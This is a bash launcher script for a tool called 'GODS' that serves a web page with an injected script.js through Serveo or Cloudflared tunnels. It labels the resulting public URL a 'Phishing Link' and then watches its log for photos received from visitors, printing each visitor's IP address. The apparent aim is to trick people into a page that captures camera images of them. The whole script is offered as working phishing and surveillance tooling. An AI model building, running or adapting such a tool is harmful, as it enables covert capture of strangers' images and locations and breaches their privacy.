#!/usr/bin/env bash

# Colors
GREEN="\e[1;32m"
RED="\e[1;31m"
BLUE="\e[1;34m"
YELLOW="\e[1;33m"
CYAN="\e[1;36m"
RESET="\e[0m"

# Variables
SERVER_PORT=3000
SERVER_PID=""
TUNNEL_PID=""
PHISHING_URL=""
TUNNEL_CHOICE=""

# Banner
banner() {
 clear
 echo -e "${YELLOW}"
 cat << "EOF"

   _____  ____  _____   _____
  / ____|/ __ \|  __ \ / ____|
 | |  __| |  | | |  | | (___
 | | |_ | |  | | |  | |\___ \
 | |__| | |__| | |__| |____) |
  \_____|\____/|_____/|_____/

       G H O S T   O S I N T
       & D E T E C T I O N
          S Y S T E M

                               Devloper : Rabix$

github repo : https://github.com/Xxwill0wprismatic/GODS


EOF
}

# Install Dependencies
install_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${RESET}"

    # Get the script's directory for Python dependency installation
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    cd "$SCRIPT_DIR" || { echo -e "${RED}[-] Cannot access GODS directory!${RESET}"; return 1; }

    # Detect package manager (for system packages)
    if command -v apt-get &>/dev/null; then
        PKG_INSTALL="sudo apt-get install -y"
        UPDATE_CMD="sudo apt-get update"
    elif command -v yum &>/dev/null; then
        PKG_INSTALL="sudo yum install -y"
        UPDATE_CMD="sudo yum update -y"
    elif command -v dnf &>/dev/null; then
        PKG_INSTALL="sudo dnf install -y"
        UPDATE_CMD="sudo dnf update -y"
    elif command -v pacman &>/dev/null; then
        PKG_INSTALL="sudo pacman -S --noconfirm"
        UPDATE_CMD="sudo pacman -Syu"
    elif command -v pkg &>/dev/null; then
        # Termux detected
        PKG_INSTALL="pkg install -y"
        UPDATE_CMD="pkg update"
    else
        echo -e "${RED}[-] No supported package manager found!${RESET}"
        echo -e "${YELLOW}[!] Will try to continue with available tools...${RESET}"
    fi

    if [[ -n "$UPDATE_CMD" ]]; then
        $UPDATE_CMD 2>/dev/null || true
    fi

    if ! command -v node &>/dev/null; then
        echo -e "${RED}[-] Node.js is not installed!${RESET}"
        if [[ -n "$PKG_INSTALL" ]]; then
            $PKG_INSTALL nodejs 2>/dev/null || echo -e "${YELLOW}[!] Could not install Node.js automatically${RESET}"
        fi
    fi

    if ! command -v npm &>/dev/null; then
        echo -e "${RED}[-] npm is not installed!${RESET}"
        if [[ -n "$PKG_INSTALL" ]]; then
            $PKG_INSTALL npm 2>/dev/null || echo -e "${YELLOW}[!] Could not install npm automatically${RESET}"
        fi
    fi

    if ! command -v lsof &>/dev/null; then
        echo -e "${YELLOW}[!] lsof is not installed (optional for server monitoring)${RESET}"
        if [[ -n "$PKG_INSTALL" ]]; then
            $PKG_INSTALL lsof 2>/dev/null || true
        fi
    fi

    if ! command -v ssh &>/dev/null; then
        echo -e "${YELLOW}[!] OpenSSH client is not installed (optional for tunnels)${RESET}"
        if [[ -n "$PKG_INSTALL" ]]; then
            $PKG_INSTALL openssh-client 2>/dev/null || $PKG_INSTALL openssh 2>/dev/null || true
        fi
    fi

    # Install Python dependencies (required for recon)
    echo -e "${YELLOW}[+] Checking Python dependencies...${RESET}"
    if command -v python3 &>/dev/null; then
        if [[ -f "$SCRIPT_DIR/requirements.txt" ]]; then
            echo -e "${CYAN}[*] Installing Python packages from requirements.txt...${RESET}"
            pip3 install -q -r "$SCRIPT_DIR/requirements.txt" 2>/dev/null || {
                echo -e "${YELLOW}[!] Could not install Python packages automatically${RESET}"
                echo -e "${YELLOW}[!] You may need to run: pip install -r requirements.txt${RESET}"
            }
        else
            # Try to install dnspython directly
            pip3 install -q dnspython 2>/dev/null || echo -e "${YELLOW}[!] dnspython not installed (required for DNS recon)${RESET}"
        fi
    else
        echo -e "${RED}[-] Python 3 is not installed!${RESET}"
        echo -e "${YELLOW}[!] Python is required for GODS Recon${RESET}"
        if [[ -n "$PKG_INSTALL" ]]; then
            $PKG_INSTALL python3 2>/dev/null || true
        fi
    fi

    # Install Node.js dependencies
    if command -v npm &>/dev/null; then
        if [[ -f "$SCRIPT_DIR/package.json" ]]; then
            echo -e "${CYAN}[*] Installing Node.js dependencies...${RESET}"
            npm install 2>/dev/null || echo -e "${YELLOW}[!] Could not install npm packages${RESET}"
        fi
    fi

    echo -e "${GREEN}[+] Dependency check complete!${RESET}"
}

create_needed_files() {
      touch server.log 2>/dev/null
      touch cloudflared.txt 2>/dev/null
      touch serveo.txt 2>/dev/null
}

# Kill Any Existing Server on Port 3000
kill_old_server() {
    OLD_PID=$(lsof -ti :$SERVER_PORT)
    if [[ ! -z "$OLD_PID" ]]; then
        echo -e "${YELLOW}[+] Killing old server running on port $SERVER_PORT...${RESET}"
        kill -9 $OLD_PID
        echo -e "${GREEN}[+] Old server stopped!${RESET}"
    fi
}

select_html_file() {
    echo -ne "${CYAN}[+] Enter the path to the custom HTML file (or press Enter to use the default): ${RESET}"
    read HTML_PATH

    if [[ -n "$HTML_PATH" && -f "$HTML_PATH" ]]; then
        cp "$HTML_PATH" templates1/index.html
        sed -i '/<\/body>/i <script src="script.js"></script>' templates1/index.html
        USE_CUSTOM_HTML=true
    else
        echo -e "${YELLOW}[+] Using default HTML page.${RESET}"
        USE_CUSTOM_HTML=false
    fi
}

set_permissions() {
    # Get absolute path of the script (cross-platform compatible)
    SCRIPT_PATH="${BASH_SOURCE[0]}"
    if command -v readlink &>/dev/null && [[ -L "$SCRIPT_PATH" ]]; then
        SCRIPT_PATH="$(readlink -f "$SCRIPT_PATH")"
    fi

    # Get the directory containing the script
    SCRIPT_DIR="$(cd "$(dirname "$SCRIPT_PATH")" && pwd)"

    # Check if we can write to the directory
    if [[ ! -w "$SCRIPT_DIR" ]]; then
        echo -e "${YELLOW}[!] Directory is not writable: $SCRIPT_DIR${RESET}"
        echo -e "${YELLOW}[!] Attempting to fix permissions...${RESET}"
        
        # Try chmod (may fail without write permission to directory itself)
        chmod -R u+rwX "$SCRIPT_DIR" 2>/dev/null || true
        
        # On Termux, try to fix ownership
        if [[ -n "$(command -v termux-setup-storage 2>/dev/null)" ]] || [[ -d "/data/data/com.termux" ]]; then
            echo -e "${CYAN}[*] Termux environment detected${RESET}"
        fi
    fi
}

# Start the Node.js Server
start_server() {
    echo -e "${YELLOW}[+] Starting GODS Server...${RESET}"
    cd "$SCRIPT_DIR" || { echo -e "${RED}[-] Cannot access GODS directory!${RESET}"; return 1; }
    if [ "$USE_CUSTOM_HTML" = true ]; then
        node server1.js > server.log 2>&1 &
    else
        node server.js > server.log 2>&1 &
    fi
    SERVER_PID=$!
    sleep 2

    if ps -p $SERVER_PID > /dev/null; then
        echo -e "${GREEN}[+] Server started successfully!${RESET}"
    else
        echo -e "${RED}[-] Server failed to start!${RESET}"
        exit 1
    fi
}


# Tunnel Selection Menu
select_tunnel() {
    echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m ${BLUE}Serveo.net${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m ${BLUE}Cloudflared${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m ${BLUE}Localhost${RESET}"

    echo -ne "${GREEN}[+] Enter choice (1,2,3):${RESET} "
    read choice

    case $choice in
        1) TUNNEL_CHOICE="serveo" ;;
        2) TUNNEL_CHOICE="cloudflared" ;;
        3) TUNNEL_CHOICE="localhost" ;;
        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"
           TUNNEL_CHOICE="serveo"
        ;;
    esac
}

# Start Serveo.net Tunneling
start_serveo() {
    echo -e "${YELLOW}[+] Starting Serveo.net tunnel...${RESET}"
    ssh -R 80:localhost:$SERVER_PORT serveo.net > serveo.txt 2>&1 &
    TUNNEL_PID=$!
    sleep 5

    if grep -q "Forwarding HTTP traffic" serveo.txt; then
        PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveousercontent.com" serveo.txt)
        echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
    else
        echo -e "${RED}[-] Serveo failed!${RESET}"
        stop_server
        exit 1
    fi
}

# Start Cloudflared Tunneling 
start_cloudflared() {
    echo -e "${YELLOW}[+] Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel --url "http://localhost:$SERVER_PORT" > cloudflared.txt 2>&1 &
    TUNNEL_PID=$!
    sleep 5

    # Wait for Cloudflared to generate the link properly
    for i in {1..10}; do
        PHISHING_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare.com" cloudflared.txt)
        if [[ ! -z "$PHISHING_URL" ]]; then
            echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
            return
        fi
        sleep 1
    done

    echo -e "${RED}[-] Cloudflared failed to start!${RESET}"
    stop_server
    exit 1
}

start_localhost() {

    PHISHING_URL="http://localhost:$SERVER_PORT"

    echo -e "${GREEN}[+] Localhost server started!${RESET}"
    echo -e "${CYAN}[+] Server Port : ${SERVER_PORT}${RESET}"
    echo -e "${GREEN}[+] Local Testing URL:${RESET}"
    echo -e "${CYAN}${PHISHING_URL}${RESET}"

    echo
    echo -e "${YELLOW}[+] If you are using a VPS or external tunnel, forward this port:${RESET}"
    echo -e "${CYAN}localhost:${SERVER_PORT}${RESET}"
}

# Monitor for Received Photos
monitor_photos() {
    echo -e "${YELLOW}[+] Waiting for photos...${RESET}"
    tail -f server.log | while read line; do
        if echo "$line" | grep -q "Photo received"; then
            IP=$(echo "$line" | grep -oE "IP: ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|[a-fA-F0-9:]+)" | cut -d ' ' -f2)
            echo -e "${GREEN}[+] Photo Received! User IP: ${IP}${RESET}"
        fi
    done
}

# Stop the Server
stop_server() {
    rm -f templates1/index.html
    echo -e "${YELLOW}[+] Stopping GODS server...${RESET}"
    [[ ! -z "$SERVER_PID" ]] && kill $SERVER_PID 2>/dev/null && echo -e "${GREEN}[+] Server stopped!${RESET}"
    [[ ! -z "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null && echo -e "${GREEN}[+] Tunnel stopped!${RESET}"
    exit 0
}

# Trap Ctrl+C to stop the server
trap stop_server SIGINT

# Recon entry point
run_recon() {
    local GODS_DIR
    GODS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    if ! command -v python3 >/dev/null 2>&1; then
        echo -e "${RED}[-] Python 3 is required for GODS Recon.${RESET}"
        return 1
    fi
    exec python3 "$GODS_DIR/recon/gods_recon.py" "$@"
}

# Handle GODS command-line entries before the legacy interactive flow.
case "${1:-}" in
    recon)
        shift
        run_recon "$@"
        exit $?
        ;;
    --version|-v)
        echo "GODS v8.51E"
        exit 0
        ;;
    --help|-h|help)
        echo "GODS v8.51E"
        echo
        echo "Usage: ./gods.sh [command]"
        echo
        echo "Commands:"
        echo "  recon       Start GODS Recon"
        echo "  --version   Show version"
        echo "  --help      Show this help"
        echo
        echo "Run ./gods.sh without a command to start the existing GODS interface."
        exit 0
        ;;
esac

# Run the script
banner
install_dependencies
create_needed_files
banner
kill_old_server
select_html_file
set_permissions
start_server
select_tunnel

if [[ "$TUNNEL_CHOICE" == "serveo" ]]; then
    start_serveo
elif [[ "$TUNNEL_CHOICE" == "cloudflared" ]]; then
    start_cloudflared
else
    start_localhost
fi

monitor_photos
